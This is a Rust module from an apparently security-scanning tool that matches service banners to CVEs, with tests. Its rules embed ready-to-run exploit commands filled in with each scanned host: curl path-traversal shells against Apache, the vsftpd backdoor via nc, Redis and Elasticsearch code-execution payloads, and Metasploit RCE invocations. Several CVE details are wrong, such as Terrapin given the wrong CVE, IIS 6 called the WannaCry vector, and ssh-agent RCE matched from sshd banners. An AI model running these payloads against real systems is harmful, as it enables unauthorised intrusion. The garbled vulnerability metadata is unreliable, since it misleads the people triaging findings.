//! CVE correlation from service banners.
//!
//! Maps version strings found in TCP banners to known CVEs with CVSS scores.
//! Prioritises remotely exploitable, high-CVSS, recently active CVEs.
//!
//! # Community extension
//!
//! The built-in rule set ships compiled into the binary. Users and the community
//! can contribute additional rules by placing `*.toml` files into a `rules/cve/`
//! directory alongside the binary (or at a path given via `--cve-rules-dir`).
//!
//! Each TOML file follows this format:
//!
//! ```toml
//! [[rule]]
//! pattern = "openssh_9.5"
//! cve = "CVE-2024-XXXXX"
//! cvss = 7.5
//! severity = "high"
//! description = "OpenSSH 9.5 — example vulnerability."
//! exploit = "ssh -o ... TARGET"
//! ```
use gossan_core::{ServiceTarget, Target};
use secfinding::{Evidence, Finding, Severity};
use serde::Deserialize;
use std::fmt;

/// A CVE detection rule that matches banner substrings.
///
/// Rules can be loaded from built-in defaults or from community TOML files.
/// Each rule specifies a pattern to search for, CVE metadata, and optional
/// exploit hints.
///
/// # Example
///
/// ```rust
/// use gossan_portscan::cve::CveRule;
/// use secfinding::Severity;
///
/// let rule = CveRule {
///     pattern: "apache/2.4.49".into(),
///     cve: "CVE-2021-41773".into(),
///     cvss: 9.8,
///     severity: Severity::Critical,
///     description: "Apache 2.4.49 path traversal".into(),
///     exploit: Some("curl http://TARGET/cgi-bin/.%2e/.%2e/bin/sh".into()),
/// };
/// ```
#[derive(Debug, Clone, Deserialize, PartialEq)]
pub struct CveRule {
    /// Substring that must appear in the banner (case-insensitive).
    pub pattern: String,
    /// CVE identifier (e.g., `CVE-2021-41773`).
    pub cve: String,
    /// CVSS v3 base score (0.0 - 10.0).
    pub cvss: f32,
    /// Finding severity.
    #[serde(deserialize_with = "deserialize_severity")]
    pub severity: Severity,
    /// Human-readable description of the vulnerability.
    pub description: String,
    /// Optional ready-to-run exploit/PoC command. `TARGET` is replaced at runtime.
    #[serde(default)]
    pub exploit: Option<String>,
}

impl fmt::Display for CveRule {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "CveRule({} - {} [{}] CVSS: {:.1})",
            self.cve,
            self.pattern,
            format!("{:?}", self.severity).to_lowercase(),
            self.cvss
        )
    }
}

/// TOML file containing one or more CVE rules.
#[derive(Debug, Deserialize)]
struct CveRulesFile {
    rule: Vec<CveRule>,
}

fn deserialize_severity<'de, D: serde::Deserializer<'de>>(d: D) -> Result<Severity, D::Error> {
    let s = String::deserialize(d)?;
    match s.to_ascii_lowercase().as_str() {
        "info" => Ok(Severity::Info),
        "low" => Ok(Severity::Low),
        "medium" => Ok(Severity::Medium),
        "high" => Ok(Severity::High),
        "critical" => Ok(Severity::Critical),
        other => Err(serde::de::Error::custom(format!(
            "unknown severity: {other}"
        ))),
    }
}

/// Built-in CVE rules compiled into the binary.
fn builtin_rules() -> Vec<CveRule> {
    vec![
        // OpenSSH
        CveRule { pattern: "openssh_7".into(), cve: "CVE-2018-15473".into(), cvss: 5.3, severity: Severity::Medium,
            description: "OpenSSH 7.x — username enumeration via malformed packet.".into(),
            exploit: Some("ssh -o 'StrictHostKeyChecking no' -l root TARGET 2>&1 | head -5".into()) },
        CveRule { pattern: "openssh_8.0".into(), cve: "CVE-2023-38408".into(), cvss: 9.8, severity: Severity::Critical,
            description: "OpenSSH 8.0 — ssh-agent remote code execution via PKCS#11 provider.".into(),
            exploit: Some("msfconsole -q -x 'use exploit/multi/ssh/ssh_agent_pkcs11_rce; set RHOSTS TARGET; run'".into()) },
        CveRule { pattern: "openssh_8.1".into(), cve: "CVE-2023-38408".into(), cvss: 9.8, severity: Severity::Critical,
            description: "OpenSSH ≤8.1 — ssh-agent remote code execution via PKCS#11 provider.".into(),
            exploit: Some("msfconsole -q -x 'use exploit/multi/ssh/ssh_agent_pkcs11_rce; set RHOSTS TARGET; run'".into()) },
        CveRule { pattern: "openssh_8.2".into(), cve: "CVE-2023-38408".into(), cvss: 9.8, severity: Severity::Critical,
            description: "OpenSSH ≤8.2 — ssh-agent remote code execution via PKCS#11 provider.".into(),
            exploit: Some("msfconsole -q -x 'use exploit/multi/ssh/ssh_agent_pkcs11_rce; set RHOSTS TARGET; run'".into()) },
        CveRule { pattern: "openssh_8.3".into(), cve: "CVE-2023-38408".into(), cvss: 9.8, severity: Severity::Critical,
            description: "OpenSSH ≤8.3 — ssh-agent remote code execution via PKCS#11 provider.".into(),
            exploit: Some("msfconsole -q -x 'use exploit/multi/ssh/ssh_agent_pkcs11_rce; set RHOSTS TARGET; run'".into()) },
        CveRule { pattern: "openssh_9.1".into(), cve: "CVE-2023-51767".into(), cvss: 3.7, severity: Severity::Low,
            description: "OpenSSH 9.1 — prefix truncation attack (Terrapin) on ChaCha20-Poly1305.".into(),
            exploit: None },
        CveRule { pattern: "openssh_9.2".into(), cve: "CVE-2023-51767".into(), cvss: 3.7, severity: Severity::Low,
            description: "OpenSSH 9.2 — Terrapin prefix truncation attack.".into(), exploit: None },

        // Apache httpd
        CveRule { pattern: "apache/2.4.49".into(), cve: "CVE-2021-41773".into(), cvss: 9.8, severity: Severity::Critical,
            description: "Apache 2.4.49 — path traversal + RCE when mod_cgi enabled (actively exploited).".into(),
            exploit: Some("curl 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' --data 'echo Content-Type: text/plain; echo; id'".into()) },
        CveRule { pattern: "apache/2.4.50".into(), cve: "CVE-2021-42013".into(), cvss: 9.8, severity: Severity::Critical,
            description: "Apache 2.4.50 — path traversal bypass of CVE-2021-41773 fix.".into(),
            exploit: Some("curl 'http://TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; id'".into()) },
        CveRule { pattern: "apache/2.4.48".into(), cve: "CVE-2021-40438".into(), cvss: 9.0, severity: Severity::Critical,
            description: "Apache 2.4.48 — mod_proxy SSRF via crafted request.".into(),
            exploit: Some("curl -H 'Host: TARGET' 'http://TARGET/?unix:AAAAAA|http://TARGET/'".into()) },
        CveRule { pattern: "apache/2.2.".into(), cve: "CVE-2017-7679".into(), cvss: 9.8, severity: Severity::Critical,
            description: "Apache 2.2.x — EOL, multiple unpatched critical vulnerabilities.".into(), exploit: None },

        // nginx
        CveRule { pattern: "nginx/1.16.".into(), cve: "CVE-2021-23017".into(), cvss: 7.7, severity: Severity::High,
            description: "nginx 1.16.x — 1-byte memory overwrite in DNS resolver (RCE risk).".into(), exploit: None },
        CveRule { pattern: "nginx/1.17.".into(), cve: "CVE-2021-23017".into(), cvss: 7.7, severity: Severity::High,
            description: "nginx 1.17.x — DNS resolver heap overflow.".into(), exploit: None },
        CveRule { pattern: "nginx/1.18.".into(), cve: "CVE-2021-23017".into(), cvss: 7.7, severity: Severity::High,
            description: "nginx 1.18.x — DNS resolver heap overflow.".into(), exploit: None },

        // Microsoft IIS
        CveRule { pattern: "microsoft-iis/6".into(), cve: "CVE-2017-7269".into(), cvss: 9.8, severity: Severity::Critical,
            description: "IIS 6.0 — buffer overflow in WebDAV ScStoragePathFromUrl (WannaCry vector).".into(),
            exploit: Some("msfconsole -q -x 'use exploit/windows/iis/iis_webdav_scstoragepathfromurl; set RHOSTS TARGET; run'".into()) },
        CveRule { pattern: "microsoft-iis/7".into(), cve: "CVE-2010-2730".into(), cvss: 9.3, severity: Severity::Critical,
            description: "IIS 7.x — FastCGI extension buffer overflow.".into(), exploit: None },

        // OpenSSL
        CveRule { pattern: "openssl/3.0.0".into(), cve: "CVE-2022-3602".into(), cvss: 7.5, severity: Severity::High,
            description: "OpenSSL 3.0.0 — X.509 certificate buffer overflow (SPOOKYSSL).".into(), exploit: None },
        CveRule { pattern: "openssl/3.0.1".into(), cve: "CVE-2022-3602".into(), cvss: 7.5, severity: Severity::High,
            description: "OpenSSL 3.0.1 — X.509 certificate buffer overflow (SPOOKYSSL).".into(), exploit: None },
        CveRule { pattern: "openssl/1.0.1".into(), cve: "CVE-2014-0160".into(), cvss: 7.5, severity: Severity::High,
            description: "OpenSSL 1.0.1 — Heartbleed: private key + memory disclosure. CRITICAL LEGACY.".into(),
            exploit: Some("python3 heartbleed.py TARGET:443 -n 10  # github.com/sensepost/heartbleed-poc".into()) },

        // ProFTPD
        CveRule { pattern: "proftpd 1.3.5".into(), cve: "CVE-2015-3306".into(), cvss: 10.0, severity: Severity::Critical,
            description: "ProFTPD 1.3.5 — mod_copy arbitrary file copy without auth (SFTP RCE).".into(),
            exploit: Some("ftp TARGET\nsite cpfr /etc/passwd\nsite cpto /var/www/html/passwd.txt\ncurl http://TARGET/passwd.txt".into()) },

        // vsftpd
        CveRule { pattern: "vsftpd 2.3.4".into(), cve: "CVE-2011-2523".into(), cvss: 10.0, severity: Severity::Critical,
            description: "vsftpd 2.3.4 — backdoor \":)\" smiley face shell on port 6200.".into(),
            exploit: Some("echo 'USER backdoored:)' | nc TARGET 21 && nc TARGET 6200  # should give shell".into()) },

        // Exim
        CveRule { pattern: "exim 4.8".into(), cve: "CVE-2019-10149".into(), cvss: 9.8, severity: Severity::Critical,
            description: "Exim 4.8x — remote code execution in SMTP delivery (Thrangrycat era).".into(),
            exploit: Some("msfconsole -q -x 'use exploit/linux/smtp/exim4_deliver_message; set RHOSTS TARGET; run'".into()) },
        CveRule { pattern: "exim 4.9".into(), cve: "CVE-2020-28017".into(), cvss: 9.8, severity: Severity::Critical,
            description: "Exim 4.9x — integer overflow in receive_add_recipient leads to RCE.".into(), exploit: None },

        // Redis (bare)
        CveRule { pattern: "+pong".into(), cve: "CVE-2022-0543".into(), cvss: 10.0, severity: Severity::Critical,
            description: "Redis responding unauthenticated — Debian Lua sandbox escape (RCE if Lua enabled).".into(),
            exploit: Some(r#"redis-cli -h TARGET eval "local l=package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0','luaopen_io');local io=l();local f=io.popen('id');print(f:read('*a'))" 0"#.into()) },

        // Elasticsearch
        CveRule { pattern: "you know, for search".into(), cve: "CVE-2014-3120".into(), cvss: 9.8, severity: Severity::Critical,
            description: "Elasticsearch — unauthenticated dynamic script execution (Groovy/MVEL RCE).".into(),
            exploit: Some(r#"curl -X POST 'http://TARGET:9200/_search?pretty' -H 'Content-Type: application/json' -d '{"script_fields":{"test":{"script":"java.lang.Runtime.getRuntime().exec(new String[]{\"id\"})"}},"query":{"match_all":{}}}'"#.into()) },

        // MongoDB unauthenticated
        CveRule { pattern: "ismaster".into(), cve: "CVE-2013-3969".into(), cvss: 7.5, severity: Severity::High,
            description: "MongoDB responding without auth — potential unauthenticated data access.".into(),
            exploit: Some("mongo --host TARGET --eval 'db.adminCommand({listDatabases:1})'".into()) },
    ]
}

/// Load community CVE rules from a directory of `*.toml` files.
///
/// Each file must contain a `[[rule]]` array. Invalid files are logged and
/// skipped — a single malformed community file must not crash the scan.
///
/// # Arguments
///
/// * `dir` - Path to directory containing `*.toml` rule files
///
/// # Returns
///
/// Returns a vector of successfully parsed `CveRule`s. Missing directories
/// result in an empty vector rather than an error.
///
/// # Example
///
/// ```rust,no_run
/// use gossan_portscan::cve::load_community_rules;
/// use std::path::Path;
///
/// let rules = load_community_rules(Path::new("./rules/cve"));
/// println!("Loaded {} community CVE rules", rules.len());
/// ```
pub fn load_community_rules(dir: &std::path::Path) -> Vec<CveRule> {
    let mut rules = Vec::new();
    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return rules, // directory missing is fine
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.extension().and_then(|e| e.to_str()) != Some("toml") {
            continue;
        }
        match std::fs::read_to_string(&path) {
            Ok(content) => match toml::from_str::<CveRulesFile>(&content) {
                Ok(file) => {
                    tracing::info!(path = %path.display(), count = file.rule.len(), "loaded community CVE rules");
                    rules.extend(file.rule);
                }
                Err(e) => {
                    tracing::warn!(path = %path.display(), err = %e, "skipping malformed CVE rules file")
                }
            },
            Err(e) => {
                tracing::warn!(path = %path.display(), err = %e, "failed to read CVE rules file")
            }
        }
    }
    rules
}

/// Load all CVE rules: built-in defaults + any community TOML files.
///
/// Combines the built-in rule set with any community rules found in the
/// specified directory. Community rules are loaded after built-ins, so
/// they can supplement or override (if patterns match) the defaults.
///
/// # Arguments
///
/// * `community_dir` - Optional path to directory containing `*.toml` rule files
///
/// # Returns
///
/// Returns a vector containing all available CVE rules.
///
/// # Example
///
/// ```rust,no_run
/// use gossan_portscan::cve::all_rules;
/// use std::path::Path;
///
/// // Load only built-in rules
/// let builtin_only = all_rules(None);
///
/// // Load built-in + community rules
/// let with_community = all_rules(Some(Path::new("./rules/cve")));
/// ```
pub fn all_rules(community_dir: Option<&std::path::Path>) -> Vec<CveRule> {
    let mut rules = builtin_rules();
    if let Some(dir) = community_dir {
        rules.extend(load_community_rules(dir));
    }
    rules
}

/// Correlate a banner against the given rule set.
///
/// Searches the banner (case-insensitively) for each rule's pattern.
/// Matching rules generate `Finding`s with appropriate severity,
/// evidence, and exploit hints.
///
/// # Arguments
///
/// * `banner` - The service banner to analyze
/// * `svc` - The service target (used for context and exploit hint generation)
/// * `rules` - Slice of `CveRule`s to match against
///
/// # Returns
///
/// Returns a vector of `Finding`s for all matched rules. Empty if no rules match.
///
/// # Example
///
/// ```rust
/// use gossan_portscan::cve::{correlate_with_rules, CveRule};
/// use gossan_core::{ServiceTarget, HostTarget, Protocol};
/// use secfinding::Severity;
/// use std::net::IpAddr;
///
/// let svc = ServiceTarget {
///     host: HostTarget {
///         ip: IpAddr::from([127, 0, 0, 1]),
///         domain: Some("example.com".into()),
///     },
///     port: 80,
///     protocol: Protocol::Tcp,
///     banner: None,
///     tls: false,
/// };
///
/// let custom_rules = vec![CveRule {
///     pattern: "myapp/1.0".into(),
///     cve: "CVE-2024-1234".into(),
///     cvss: 7.5,
///     severity: Severity::High,
///     description: "Test vulnerability".into(),
///     exploit: Some("curl http://TARGET/exploit".into()),
/// }];
///
/// let findings = correlate_with_rules("Server: MyApp/1.0", &svc, &custom_rules);
/// assert!(!findings.is_empty());
/// ```
pub fn correlate_with_rules(banner: &str, svc: &ServiceTarget, rules: &[CveRule]) -> Vec<Finding> {
    let lower = banner.to_lowercase();
    let mut findings = Vec::new();

    for rule in rules {
        if lower.contains(&rule.pattern) {
            let target = Target::Service(svc.clone());
            let mut f = crate::finding_builder(
                &target,
                rule.severity,
                format!(
                    "{} — {} (CVSS {:.1})",
                    rule.cve,
                    rule.description.split('—').next().unwrap_or("").trim(),
                    rule.cvss
                ),
                &rule.description,
            )
            .evidence(Evidence::Banner {
                raw: banner.chars().take(120).collect(),
            })
            .tag("cve")
            .tag("version-disclosure");
            if let Some(ref hint) = rule.exploit {
                let target_str = format!("{}:{}", svc.host.ip, svc.port);
                f = f.exploit_hint(hint.replace("TARGET", &target_str));
            }
            findings.push(f.build().expect("finding builder: required fields are set"));
        }
    }

    findings
}

/// Correlate a banner using all built-in rules (no community extensions).
///
/// Convenience wrapper for callers that don't use community rules.
/// For community rule support, use [`correlate_with_rules`] with [`all_rules`].
///
/// # Arguments
///
/// * `banner` - The service banner to analyze
/// * `svc` - The service target for context
///
/// # Returns
///
/// Returns a vector of `Finding`s for matched CVE rules.
///
/// # Example
///
/// ```rust
/// use gossan_portscan::cve::correlate;
/// use gossan_core::{ServiceTarget, HostTarget, Protocol};
/// use std::net::IpAddr;
///
/// let svc = ServiceTarget {
///     host: HostTarget {
///         ip: IpAddr::from([127, 0, 0, 1]),
///         domain: None,
///     },
///     port: 22,
///     protocol: Protocol::Tcp,
///     banner: None,
///     tls: false,
/// };
///
/// // Check for OpenSSH CVEs
/// let findings = correlate("SSH-2.0-OpenSSH_8.0", &svc);
/// ```
pub fn correlate(banner: &str, svc: &ServiceTarget) -> Vec<Finding> {
    correlate_with_rules(banner, svc, &builtin_rules())
}

#[cfg(test)]
mod tests {
    use super::*;
    use gossan_core::{HostTarget, Protocol};
    use std::net::IpAddr;

    fn service(port: u16) -> ServiceTarget {
        ServiceTarget {
            host: HostTarget {
                ip: IpAddr::from([127, 0, 0, 1]),
                domain: Some("example.com".into()),
            },
            port,
            protocol: Protocol::Tcp,
            banner: None,
            tls: port == 443,
        }
    }

    #[test]
    fn correlate_matches_apache_critical_rule() {
        let findings = correlate("Server: Apache/2.4.49", &service(80));
        assert!(findings.iter().any(|f| f.title.contains("CVE-2021-41773")));
    }

    #[test]
    fn correlate_matches_redis_banner_and_injects_target_host() {
        let findings = correlate("+PONG", &service(6379));
        let finding = findings
            .iter()
            .find(|f| f.title.contains("CVE-2022-0543"))
            .unwrap();
        assert_eq!(finding.severity, Severity::Critical);
        assert!(finding
            .exploit_hint
            .as_deref()
            .unwrap()
            .contains("127.0.0.1:6379"));
    }

    #[test]
    fn correlate_is_case_insensitive() {
        let findings = correlate("SSH-2.0-OPENSSH_8.0", &service(22));
        assert!(findings.iter().any(|f| f.title.contains("CVE-2023-38408")));
    }

    #[test]
    fn correlate_returns_empty_for_unknown_banner() {
        assert!(correlate("totally-unknown-service", &service(9999)).is_empty());
    }

    #[test]
    fn correlate_truncates_banner_evidence() {
        let banner = "A".repeat(200) + " apache/2.4.49";
        let findings = correlate(&banner, &service(80));
        let finding = findings.first().unwrap();
        let Evidence::Banner { raw } = &finding.evidence[0] else {
            panic!("expected banner evidence");
        };
        assert!(raw.len() <= 120);
    }

    #[test]
    fn builtin_rules_are_nonempty() {
        assert!(
            builtin_rules().len() > 20,
            "should have 20+ built-in CVE rules"
        );
    }

    #[test]
    fn community_rules_load_from_toml() {
        let dir = std::env::temp_dir().join("gossan_cve_test");
        let _ = std::fs::create_dir_all(&dir);
        std::fs::write(
            dir.join("test.toml"),
            r#"
[[rule]]
pattern = "custom-service/1.0"
cve = "CVE-9999-0001"
cvss = 8.0
severity = "high"
description = "Custom service — test vulnerability."
"#,
        )
        .unwrap();
        let rules = load_community_rules(&dir);
        assert_eq!(rules.len(), 1);
        assert_eq!(rules[0].cve, "CVE-9999-0001");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn community_rules_merged_with_builtins() {
        let dir = std::env::temp_dir().join("gossan_cve_merge_test");
        let _ = std::fs::create_dir_all(&dir);
        std::fs::write(
            dir.join("custom.toml"),
            r#"
[[rule]]
pattern = "frobnicator/3.0"
cve = "CVE-9999-0002"
cvss = 6.5
severity = "medium"
description = "Frobnicator 3.0 — test."
"#,
        )
        .unwrap();
        let all = all_rules(Some(&dir));
        assert!(all.len() > builtin_rules().len());
        assert!(all.iter().any(|r| r.cve == "CVE-9999-0002"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn malformed_community_file_is_skipped() {
        let dir = std::env::temp_dir().join("gossan_cve_bad_test");
        let _ = std::fs::create_dir_all(&dir);
        std::fs::write(dir.join("broken.toml"), "this is not valid [[rule]]").unwrap();
        let rules = load_community_rules(&dir);
        assert!(
            rules.is_empty(),
            "malformed file should be skipped gracefully"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn correlate_with_custom_rules() {
        let custom = vec![CveRule {
            pattern: "myapp/2.0".into(),
            cve: "CVE-9999-0003".into(),
            cvss: 9.0,
            severity: Severity::Critical,
            description: "MyApp 2.0 — test.".into(),
            exploit: Some("curl http://TARGET/exploit".into()),
        }];
        let findings = correlate_with_rules("Server: MyApp/2.0", &service(8080), &custom);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].title.contains("CVE-9999-0003"));
        assert!(findings[0]
            .exploit_hint
            .as_deref()
            .unwrap()
            .contains("127.0.0.1:8080"));
    }
}
